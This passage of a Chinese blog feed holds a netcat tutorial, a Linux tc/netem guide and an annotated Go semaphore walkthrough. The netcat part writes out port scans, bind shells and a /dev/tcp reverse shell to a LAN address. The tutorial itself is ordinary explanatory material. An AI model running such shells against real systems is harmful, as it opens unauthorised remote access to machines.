        <content type="html"><![CDATA[<h2 id="nc"><a href="#nc" class="headerlink" title="nc"></a>nc</h2><p>nc是网络工具中的瑞士军刀。<strong>nc命令</strong> 全称<strong>netcat</strong>，用于TCP、UDP或unix域套接字(uds)的数据流操作，它可以打开TCP连接，发送UDP数据包，监听任意TCP 和UDP端口，同时也可用作做端口扫描，支持IPv4和IPv6，与Telnet的不同在于nc可以编写脚本。</p><h3 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">nc</span> <span class="token punctuation">[</span>-hlnruz<span class="token punctuation">]</span><span class="token punctuation">[</span>-g<span class="token operator">&lt;</span>网关<span class="token punctuation">..</span>.<span class="token operator">></span><span class="token punctuation">]</span><span class="token punctuation">[</span>-G<span class="token operator">&lt;</span>指向器数目<span class="token operator">></span><span class="token punctuation">]</span><span class="token punctuation">[</span>-i<span class="token operator">&lt;</span>延迟秒数<span class="token operator">></span><span class="token punctuation">]</span><span class="token punctuation">[</span>-o<span class="token operator">&lt;</span>输出文件<span class="token operator">></span><span class="token punctuation">]</span><span class="token punctuation">[</span>-p<span class="token operator">&lt;</span>通信端口<span class="token operator">></span><span class="token punctuation">]</span><span class="token punctuation">[</span>-s<span class="token operator">&lt;</span>来源位址<span class="token operator">></span><span class="token punctuation">]</span><span class="token punctuation">[</span>-v<span class="token punctuation">..</span>.<span class="token punctuation">]</span><span class="token punctuation">[</span>-w<span class="token operator">&lt;</span>超时秒数<span class="token operator">></span><span class="token punctuation">]</span><span class="token punctuation">[</span>主机名称<span class="token punctuation">]</span><span class="token punctuation">[</span>通信端口<span class="token punctuation">..</span>.<span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="选项"><a href="#选项" class="headerlink" title="选项"></a>选项</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token parameter variable">-4</span> 只使用IPV4<span class="token parameter variable">-6</span> 只使用IPV6<span class="token parameter variable">-c</span> 使用tls连接或者监听<span class="token parameter variable">-D</span> 启用socket调试开关<span class="token parameter variable">-g</span> <span class="token operator">&lt;</span>网关<span class="token operator">></span> <span class="token comment"># 设置路由器跃程通信网关，最多可设置8个。</span>-G<span class="token operator">&lt;</span>指向器数目<span class="token operator">></span> <span class="token comment"># 设置来源路由指向器，其数值为4的倍数。</span><span class="token parameter variable">-h</span> 在线帮助。-i<span class="token operator">&lt;</span>延迟秒数<span class="token operator">></span> 设置时间间隔，以便传送信息及扫描通信端口。<span class="token parameter variable">-l</span> 使用监听模式，管控传入的资料。<span class="token parameter variable">-n</span> 直接使用IP地址，而不通过域名服务器。-o<span class="token operator">&lt;</span>输出文件<span class="token operator">></span> <span class="token comment"># 指定文件名称，把往来传输的数据以16进制字码倾倒成该文件保存。</span>-p<span class="token operator">&lt;</span>通信端口<span class="token operator">></span> <span class="token comment"># 设置本地主机使用的通信端口。</span><span class="token parameter variable">-r</span> 乱数指定本地与远端主机的通信端口。-s<span class="token operator">&lt;</span>来源位址<span class="token operator">></span> <span class="token comment"># 设置本地主机送出数据包的IP地址。</span><span class="token parameter variable">-u</span> 使用UDP传输协议。<span class="token parameter variable">-v</span> 显示指令执行过程。-w<span class="token operator">&lt;</span>超时秒数<span class="token operator">></span> <span class="token comment"># 设置等待连线的时间。</span><span class="token parameter variable">-z</span> 使用0输入/输出模式，只在扫描通信端口时使用。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="举例"><a href="#举例" class="headerlink" title="举例"></a>举例</h3><p><strong>TCP端口扫描</strong></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">[</span>root@localhost ~<span class="token punctuation">]</span><span class="token comment"># nc -v -z -w2 192.168.0.3 1-100 </span><span class="token number">192.168</span>.0.3: inverse <span class="token function">host</span> lookup failed: Unknown <span class="token function">host</span><span class="token punctuation">(</span>UNKNOWN<span class="token punctuation">)</span> <span class="token punctuation">[</span><span class="token number">192.168</span>.0.3<span class="token punctuation">]</span> <span class="token number">80</span> <span class="token punctuation">(</span>http<span class="token punctuation">)</span> <span class="token function">open</span><span class="token punctuation">(</span>UNKNOWN<span class="token punctuation">)</span> <span class="token punctuation">[</span><span class="token number">192.168</span>.0.3<span class="token punctuation">]</span> <span class="token number">23</span> <span class="token punctuation">(</span>telnet<span class="token punctuation">)</span> <span class="token function">open</span><span class="token punctuation">(</span>UNKNOWN<span class="token punctuation">)</span> <span class="token punctuation">[</span><span class="token number">192.168</span>.0.3<span class="token punctuation">]</span> <span class="token number">22</span> <span class="token punctuation">(</span>ssh<span class="token punctuation">)</span> <span class="token function">open</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>扫描192.168.0.3 的端口 范围是 1-100 <strong>扫描UDP端口</strong></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">[</span>root@localhost ~<span class="token punctuation">]</span><span class="token comment"># nc -u -z -w2 192.168.0.3 1-1000  # 扫描192.168.0.3 的端口 范围是 1-1000</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>扫描指定端口</strong></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">[</span>root@localhost ~<span class="token punctuation">]</span><span class="token comment"># nc -nvv 192.168.0.1 80 # 扫描 80端口</span><span class="token punctuation">(</span>UNKNOWN<span class="token punctuation">)</span> <span class="token punctuation">[</span><span class="token number">192.168</span>.0.1<span class="token punctuation">]</span> <span class="token number">80</span> <span class="token punctuation">(</span>?<span class="token punctuation">)</span> <span class="token function">open</span>y  //用户输入<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>查看从服务器到目的地的出站端口 443 是否被防火墙阻止</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">nc</span> <span class="token parameter variable">-vz</span> acme-v02.api.letsencrypt.org <span class="token number">443</span> <span class="token parameter variable">-w2</span><span class="token comment"># Ncat: Version 7.50 ( https://nmap.org/ncat )</span><span class="token comment"># Ncat: Connected to 23.77.214.183:443.</span><span class="token comment"># Ncat: 0 bytes sent, 0 bytes received in 0.07 seconds.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><strong>文件传输</strong></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 接收方提前设置监听端口与要接收的文件名（文件名可自定义）：</span><span class="token function">nc</span> <span class="token parameter variable">-lp</span> <span class="token number">8888</span> <span class="token operator">></span> node.tar.gz<span class="token comment"># 传输方发文件：</span><span class="token function">nc</span> <span class="token parameter variable">-nv</span> <span class="token number">192.168</span>.75.121 <span class="token number">8888</span>  <span class="token operator">&lt;</span> node_exporter-1.3.1.linux-amd64.tar.gz<span class="token comment"># ⚠️ 注意：192.168.75.121是接收方的ip地址。</span><span class="token comment"># 如果希望文件传输结束后自动退出，可以使用下面的命令：</span><span class="token function">nc</span> <span class="token parameter variable">-lp</span> <span class="token number">8888</span> <span class="token operator">></span> node.tar.gz<span class="token function">nc</span> <span class="token parameter variable">-nv</span> <span class="token number">192.168</span>.75.121 <span class="token number">8888</span> <span class="token parameter variable">-i</span> <span class="token number">1</span> <span class="token operator">&lt;</span> node_exporter-1.3.1.linux-amd64.tar.gz<span class="token comment"># ⚠️ 注意：-i 表示闲置超时时间</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>远程控制</strong></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 正向控制，被控端主动设置监听端口及bash环境，控制端连接，如果有防火墙，需开放端口，否则会被拦截。</span><span class="token comment"># 被控制端执行下面的命令：</span><span class="token function">nc</span> <span class="token parameter variable">-lvnp</span> <span class="token number">8888</span> <span class="token parameter variable">-c</span> <span class="token function">bash</span><span class="token comment"># 控制端执行下面的命令：</span><span class="token function">nc</span> <span class="token number">192.168</span>.75.121 <span class="token number">8888</span><span class="token comment"># 反向控制，控制端设置监听端口，被控端主动连接控制端的ip及端口，并提供bash环境。</span><span class="token comment"># 控制端执行下面的命令：</span><span class="token function">nc</span> <span class="token parameter variable">-lvnp</span> <span class="token number">8888</span><span class="token comment"># 被控制端执行下面的命令：</span><span class="token function">nc</span> <span class="token number">192.168</span>.75.121 <span class="token number">8888</span> <span class="token parameter variable">-c</span> <span class="token function">bash</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>反弹shell</strong></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 控制端执行下面的命令：</span><span class="token function">nc</span> <span class="token parameter variable">-lvnp</span> <span class="token number">8888</span><span class="token comment"># 被控端执行下面的命令:</span><span class="token function">bash</span> <span class="token parameter variable">-i</span> <span class="token operator">&amp;></span> /dev/tcp/192.168.75.121/8888 <span class="token operator"><span class="token file-descriptor important">0</span>></span><span class="token file-descriptor important">&amp;1</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 网络 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络工具 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux下使用tc模拟网络延迟和丢包</title>
      <link href="/%E7%BD%91%E7%BB%9C/2023-02-01-%E7%BD%91%E7%BB%9C-Linux%E4%B8%8B%E4%BD%BF%E7%94%A8tc%E6%A8%A1%E6%8B%9F%E7%BD%91%E7%BB%9C%E5%BB%B6%E8%BF%9F%E5%92%8C%E4%B8%A2%E5%8C%85/"/>
      <url>/%E7%BD%91%E7%BB%9C/2023-02-01-%E7%BD%91%E7%BB%9C-Linux%E4%B8%8B%E4%BD%BF%E7%94%A8tc%E6%A8%A1%E6%8B%9F%E7%BD%91%E7%BB%9C%E5%BB%B6%E8%BF%9F%E5%92%8C%E4%B8%A2%E5%8C%85/</url>
      
        <content type="html"><![CDATA[<h3 id="模拟延迟传输简介"><a href="#模拟延迟传输简介" class="headerlink" title="模拟延迟传输简介"></a>模拟延迟传输简介</h3><p>netem 与 tc: netem 是 Linux 2.6 及以上内核版本提供的一个网络模拟功能模块。该功能模块可以用来在性能良好的局域网中,模拟出复杂的互联网传输性能,诸如低带宽、传输延迟、丢包等等情况。使用 Linux 2.6 (或以上) 版本内核的很多发行版 Linux 都开启了该内核功能,比如 Fedora、Ubuntu、Redhat、OpenSuse、CentOS、Debian 等等。 tc 是Linux 系统中的一个工具,全名为 traffic control(流量控制)。tc 可以用来控制 netem 的工作模式,也就是说,如果想使用 netem ,需要至少两个条件,一个是内核中的 netem 功能被包含,另一个是要有 tc 。</p><p>需要注意的是:本文介绍的流控只能控制发包动作,不能控制收包动作,同时,它直接对物理接口生效,如果控制了物理的 eth0,那么逻辑网卡(比如 eth0:1)也会受到影响,反之,如果您在逻辑网卡上做控制,该控制可能是无效的。(注:虚拟机中的多个网卡可以在虚拟机中视为多个物理网卡)。</p><h3 id="TC是什么"><a href="#TC是什么" class="headerlink" title="TC是什么"></a>TC是什么</h3><p>TC 全称 Traffic Control，是 Linux 内核提供的流量限速、整形和策略控制的机制。它利用一些队列规则来处理数据包的队列，并定义队列中的数据包被发送的方式， 从而实现对流量的控制。TC 使用的队列规则分为两类，一类是无类别队列规则， 另一类是分类队列规则。 无类别队列规则相对简单，而分类队列规则则引出了分类和过滤器等概念，使其流量控制功能增强。在分布式系统实验中，通常用于对进出网卡的数据包进行控制，进而模拟网络延时和带宽。</p><p>流量的控制通常发生在输出网卡处，我们可以通过改变发送次序来控制传输速率。流量控制的一个基本概念是队列，每个网卡都与一个队列相联系，可以说，所有的流量控制都发生在队列中（没有入向队列）。</p><h3 id="流量控制术语"><a href="#流量控制术语" class="headerlink" title="流量控制术语"></a>流量控制术语</h3><ul><li>Scheduling（调度）：判断某些包是不是要先于其他包发送出去，这个过程称为调度，也被成为 Reordering（重排序）。</li><li>Shaping（整形）：在包发送出去之前进行延迟处理，以达到预设的最大发送速率的过程。</li><li>Policing（执行策略）：延迟或丢弃包来达到预设带宽。</li><li>Dropping（丢弃）：如果流量超过设定带宽，则丢弃数据包，不管是入向还是出向。</li><li>Work-Conserving（随到随发）：只要有包可发送就立即发送。</li><li>non-Work-Conserving（非随到随发）：可能会延迟一段时间再将一个包发送出去，以达到期望的带宽 。这意味着它们有时即使有能力发送，也不会发送。</li></ul><h4 id="延迟"><a href="#延迟" class="headerlink" title="延迟"></a>延迟</h4><ol><li><p>延迟</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># eth0 网卡的传输设置为延迟 100 毫秒发送</span>tc qdisc <span class="token function">add</span> dev eth0 root netem delay 100ms<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p>延迟+抖动</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># eth0 网卡的传输设置为延迟 100ms ± 10ms (90 ~ 110 ms 之间的任意值)发送</span>tc qdisc <span class="token function">add</span> dev eth0 root netem delay 100ms 10ms<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p>延迟+抖动+随机</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># eth0 网卡的传输设置为 100ms ,同时,大约有 30% 的包会延迟 ± 10ms 发送</span>tc qdisc <span class="token function">add</span> dev eth0 root netem delay 100ms 10ms <span class="token number">30</span>%<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li></ol><h4 id="丢包"><a href="#丢包" class="headerlink" title="丢包"></a>丢包</h4><ol><li><p>丢包</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># eth0 网卡的传输设置为随机丢掉 1% 的数据包</span>tc qdisc <span class="token function">add</span> dev eth0 root netem loss <span class="token number">1</span>%<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p>丢包+随机</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># eth0 网卡的传输设置为随机丢掉 1% 的数据包,成功率为 30%</span>tc qdisc <span class="token function">add</span> dev eth0 root netem loss <span class="token number">1</span>% <span class="token number">30</span>%<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li></ol><h4 id="包重复"><a href="#包重复" class="headerlink" title="包重复"></a>包重复</h4><ol><li>重复数据包<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># eth0 网卡的传输设置为随机产生 1% 的重复数据包</span>tc qdisc <span class="token function">add</span> dev eth0 root netem duplicate <span class="token number">1</span>%<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li></ol><h4 id="包损坏"><a href="#包损坏" class="headerlink" title="包损坏"></a>包损坏</h4><ol><li>数据包损坏(内核版本需在 2.6.16 以上)<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># eth0 网卡的传输设置为随机产生 0.2% 的损坏的数据包 </span>tc qdisc <span class="token function">add</span> dev eth0 root netem corrupt <span class="token number">0.2</span>%<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li></ol><h4 id="包乱序"><a href="#包乱序" class="headerlink" title="包乱序"></a>包乱序</h4><ol><li>数据包乱序<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># eth0 网卡的传输设置为:有 25% 的数据包(50%相关)会被立即发送,其他的延迟10 秒</span>tc qdisc change dev eth0 root netem delay 10ms reorder <span class="token number">25</span>% <span class="token number">50</span>%<span class="token comment"># 新版本中,如下命令也会在一定程度上打乱发包的次序</span>tc qdisc <span class="token function">add</span> dev eth0 root netem delay 100ms 10ms<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li></ol><h4 id="查看"><a href="#查看" class="headerlink" title="查看"></a>查看</h4><ol><li>查看配置<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">tc qdisc show dev eth0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ol><h4 id="删除"><a href="#删除" class="headerlink" title="删除"></a>删除</h4><ol><li>删除配置<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 删除 eth0 网卡的相关传输配置</span>tc qdisc del dev eth0 XXXXXXXXXXX<span class="token punctuation">(</span>自己加的配置<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li></ol>]]></content>
      
      
      <categories>
          
          <category> 网络 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络工具 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Golang-信号量semaphore</title>
      <link href="/Code/Code-Golang-semaphore/"/>
      <url>/Code/Code-Golang-semaphore/</url>
      
        <content type="html"><![CDATA[<div class="note info no-icon">      <a class="no-line-link" href="../../scode">本文分类《源码计划》</a></div><h2 id="semaphore"><a href="#semaphore" class="headerlink" title="semaphore"></a>semaphore</h2><p>带权重的信号量在Golang中提供了一种灵活的机制，用于管理对共享资源的并发访问。通过合理使用带权重的信号量，可以更好地平衡并发访问和资源使用，从而提高程序的性能和稳定性</p><h3 id="数据结构"><a href="#数据结构" class="headerlink" title="数据结构"></a>数据结构</h3><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token comment">// 一个 watier 就表示一个请求，其中n表示这次请求的资源数量</span><span class="token keyword">type</span> waiter <span class="token keyword">struct</span> <span class="token punctuation">&#123;</span>    n     <span class="token builtin">int64</span>    ready <span class="token keyword">chan</span><span class="token operator">&lt;-</span> <span class="token keyword">struct</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span> <span class="token comment">// Closed when semaphore acquired.</span><span class="token punctuation">&#125;</span><span class="token keyword">type</span> Weighted <span class="token keyword">struct</span> <span class="token punctuation">&#123;</span>  <span class="token comment">// 最大资源数量，取走时会减少，释放时会增加</span>    size    <span class="token builtin">int64</span>  <span class="token comment">// 记录当前已使用资源数，值范围[0 - size]</span>    cur     <span class="token builtin">int64</span>    mu      sync<span class="token punctuation">.</span>Mutex  <span class="token comment">// 当前处于等待休眠的请求者goroutine，每个请求者请求的资源数量可能不一样，只有在请求时，可用资源数量不足时请求者才会进入请求链表，每个请求者表示一个goroutine</span>    waiters list<span class="token punctuation">.</span>List<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="方法列表"><a href="#方法列表" class="headerlink" title="方法列表"></a>方法列表</h3><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token comment">// 创建一类资源，参数 n 资源表示最大可用资源总个数</span><span class="token keyword">func</span> <span class="token function">NewWeighted</span><span class="token punctuation">(</span>n <span class="token builtin">int64</span><span class="token punctuation">)</span> <span class="token operator">*</span>Weighted<span class="token comment">// 获取指定个数的资源，如果当前没有空闲资源可用，当前请求者goroutine将陷入休眠状态</span><span class="token comment">// 可以一次获取多个资源，如果没有足够多的资源，调用者就会被阻塞。它的第一个参数是 Context，这就意味着，你可以通过 Context 增加超时或者 cancel 的机制。如果是正常获取了资源，就返回 nil；否则，就返回 ctx.Err()，信号量不改变</span><span class="token keyword">func</span> <span class="token punctuation">(</span>s <span class="token operator">*</span>Weighted<span class="token punctuation">)</span> <span class="token function">Acquire</span><span class="token punctuation">(</span>ctx context<span class="token punctuation">.</span>Context<span class="token punctuation">,</span> n <span class="token builtin">int64</span><span class="token punctuation">)</span> <span class="token builtin">error</span><span class="token comment">// 释放资源</span><span class="token keyword">func</span> <span class="token punctuation">(</span>s <span class="token operator">*</span>Weighted<span class="token punctuation">)</span> <span class="token function">Release</span><span class="token punctuation">(</span>n <span class="token builtin">int64</span><span class="token punctuation">)</span><span class="token comment">// 同 Acquire 一样，但当无空闲资源将直接返回false，而不阻塞</span><span class="token keyword">func</span> <span class="token punctuation">(</span>s <span class="token operator">*</span>Weighted<span class="token punctuation">)</span> <span class="token function">TryAcquire</span><span class="token punctuation">(</span>n <span class="token builtin">int64</span><span class="token punctuation">)</span> <span class="token builtin">bool</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="Acquire-和-TryAcquire"><a href="#Acquire-和-TryAcquire" class="headerlink" title="Acquire 和 TryAcquire"></a>Acquire 和 TryAcquire</h3><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">func</span> <span class="token punctuation">(</span>s <span class="token operator">*</span>Weighted<span class="token punctuation">)</span> <span class="token function">Acquire</span><span class="token punctuation">(</span>ctx context<span class="token punctuation">.</span>Context<span class="token punctuation">,</span> n <span class="token builtin">int64</span><span class="token punctuation">)</span> <span class="token builtin">error</span> <span class="token punctuation">&#123;</span>    s<span class="token punctuation">.</span>mu<span class="token punctuation">.</span><span class="token function">Lock</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment">// 如果恰好有足够的资源，也没有排队等待获取资源的goroutine，</span>    <span class="token comment">// 将cur加上n后直接返回</span>    <span class="token keyword">if</span> s<span class="token punctuation">.</span>size<span class="token operator">-</span>s<span class="token punctuation">.</span>cur <span class="token operator">>=</span> n <span class="token operator">&amp;&amp;</span> s<span class="token punctuation">.</span>waiters<span class="token punctuation">.</span><span class="token function">Len</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span> <span class="token punctuation">&#123;</span>      s<span class="token punctuation">.</span>cur <span class="token operator">+=</span> n      s<span class="token punctuation">.</span>mu<span class="token punctuation">.</span><span class="token function">Unlock</span><span class="token punctuation">(</span><span class="token punctuation">)</span>      <span class="token keyword">return</span> <span class="token boolean">nil</span>    <span class="token punctuation">&#125;</span>      <span class="token comment">// 请求的资源数大于能提供的最大的资源数</span>    <span class="token comment">// 这个任务处理不了，走错误处理逻辑</span>    <span class="token keyword">if</span> n <span class="token operator">></span> s<span class="token punctuation">.</span>size <span class="token punctuation">&#123;</span>      s<span class="token punctuation">.</span>mu<span class="token punctuation">.</span><span class="token function">Unlock</span><span class="token punctuation">(</span><span class="token punctuation">)</span>      <span class="token comment">// 依赖ctx的状态返回，否则一直等待</span>      <span class="token operator">&lt;-</span>ctx<span class="token punctuation">.</span><span class="token function">Done</span><span class="token punctuation">(</span><span class="token punctuation">)</span>      <span class="token keyword">return</span> ctx<span class="token punctuation">.</span><span class="token function">Err</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// 现存资源不够, 需要把调用者加入到等待队列中</span>    <span class="token comment">// 创建了一个ready chan,以便被通知唤醒</span>    ready <span class="token operator">:=</span> <span class="token function">make</span><span class="token punctuation">(</span><span class="token keyword">chan</span> <span class="token keyword">struct</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>    w <span class="token operator">:=</span> waiter<span class="token punctuation">&#123;</span>n<span class="token punctuation">:</span> n<span class="token punctuation">,</span> ready<span class="token punctuation">:</span> ready<span class="token punctuation">&#125;</span>    elem <span class="token operator">:=</span> s<span class="token punctuation">.</span>waiters<span class="token punctuation">.</span><span class="token function">PushBack</span><span class="token punctuation">(</span>w<span class="token punctuation">)</span>    s<span class="token punctuation">.</span>mu<span class="token punctuation">.</span><span class="token function">Unlock</span><span class="token punctuation">(</span><span class="token punctuation">)</span>      <span class="token comment">// 等待</span>    <span class="token keyword">select</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">case</span> <span class="token operator">&lt;-</span>ctx<span class="token punctuation">.</span><span class="token function">Done</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment">// context的Done被关闭</span>      err <span class="token operator">:=</span> ctx<span class="token punctuation">.</span><span class="token function">Err</span><span class="token punctuation">(</span><span class="token punctuation">)</span>      s<span class="token punctuation">.</span>mu<span class="token punctuation">.</span><span class="token function">Lock</span><span class="token punctuation">(</span><span class="token punctuation">)</span>      <span class="token keyword">select</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">case</span> <span class="token operator">&lt;-</span>ready<span class="token punctuation">:</span> <span class="token comment">// 如果被唤醒了，忽略ctx的状态</span>        err <span class="token operator">=</span> <span class="token boolean">nil</span>      <span class="token keyword">default</span><span class="token punctuation">:</span> <span class="token comment">// 通知waiter</span>        isFront <span class="token operator">:=</span> s<span class="token punctuation">.</span>waiters<span class="token punctuation">.</span><span class="token function">Front</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> elem        <span class="token comment">// 已经通过ctx退出了，删除</span>        s<span class="token punctuation">.</span>waiters<span class="token punctuation">.</span><span class="token function">Remove</span><span class="token punctuation">(</span>elem<span class="token punctuation">)</span>        <span class="token comment">// 如果当前元素正好位于链表最前面，且还存在可用的资源，就通知其它waiters</span>        <span class="token keyword">if</span> isFront <span class="token operator">&amp;&amp;</span> s<span class="token punctuation">.</span>size <span class="token operator">></span> s<span class="token punctuation">.</span>cur <span class="token punctuation">&#123;</span>          s<span class="token punctuation">.</span><span class="token function">notifyWaiters</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">&#125;</span>      <span class="token punctuation">&#125;</span>      s<span class="token punctuation">.</span>mu<span class="token punctuation">.</span><span class="token function">Unlock</span><span class="token punctuation">(</span><span class="token punctuation">)</span>      <span class="token keyword">return</span> err    <span class="token keyword">case</span> <span class="token operator">&lt;-</span>ready<span class="token punctuation">:</span> <span class="token comment">// 等待者被唤醒了</span>      <span class="token keyword">return</span> <span class="token boolean">nil</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span><span class="token keyword">func</span> <span class="token punctuation">(</span>s <span class="token operator">*</span>Weighted<span class="token punctuation">)</span> <span class="token function">TryAcquire</span><span class="token punctuation">(</span>n <span class="token builtin">int64</span><span class="token punctuation">)</span> <span class="token builtin">bool</span> <span class="token punctuation">&#123;</span>    s<span class="token punctuation">.</span>mu<span class="token punctuation">.</span><span class="token function">Lock</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    success <span class="token operator">:=</span> s<span class="token punctuation">.</span>size<span class="token operator">-</span>s<span class="token punctuation">.</span>cur <span class="token operator">>=</span> n <span class="token operator">&amp;&amp;</span> s<span class="token punctuation">.</span>waiters<span class="token punctuation">.</span><span class="token function">Len</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span>    <span class="token keyword">if</span> success <span class="token punctuation">&#123;</span>        s<span class="token punctuation">.</span>cur <span class="token operator">+=</span> n    <span class="token punctuation">&#125;</span>    s<span class="token punctuation">.</span>mu<span class="token punctuation">.</span><span class="token function">Unlock</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> success<span class="token punctuation">&#125;</span><span class="token keyword">func</span> <span class="token punctuation">(</span>s <span class="token operator">*</span>Weighted<span class="token punctuation">)</span> <span class="token function">notifyWaiters</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">for</span> <span class="token punctuation">&#123;</span>      next <span class="token operator">:=</span> s<span class="token punctuation">.</span>waiters<span class="token punctuation">.</span><span class="token function">Front</span><span class="token punctuation">(</span><span class="token punctuation">)</span>      <span class="token keyword">if</span> next <span class="token operator">==</span> <span class="token boolean">nil</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">break</span> <span class="token comment">// 没有等待者了，直接返回</span>      <span class="token punctuation">&#125;</span>        w <span class="token operator">:=</span> next<span class="token punctuation">.</span>Value<span class="token punctuation">.</span><span class="token punctuation">(</span>waiter<span class="token punctuation">)</span>      <span class="token keyword">if</span> s<span class="token punctuation">.</span>size<span class="token operator">-</span>s<span class="token punctuation">.</span>cur <span class="token operator">&lt;</span> w<span class="token punctuation">.</span>n <span class="token punctuation">&#123;</span>        <span class="token comment">// 如果现有资源不够队列头调用者请求的资源数，就退出所有等待者会继续等待</span>        <span class="token comment">// 这里还是按照先入先出的方式处理是为了避免饥饿</span>        <span class="token keyword">break</span>      <span class="token punctuation">&#125;</span>      s<span class="token punctuation">.</span>cur <span class="token operator">+=</span> w<span class="token punctuation">.</span>n      s<span class="token punctuation">.</span>waiters<span class="token punctuation">.</span><span class="token function">Remove</span><span class="token punctuation">(</span>next<span class="token punctuation">)</span>      <span class="token function">close</span><span class="token punctuation">(</span>w<span class="token punctuation">.</span>ready<span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="Release"><a href="#Release" class="headerlink" title="Release"></a>Release</h3><pre class="line-numbers language-go" 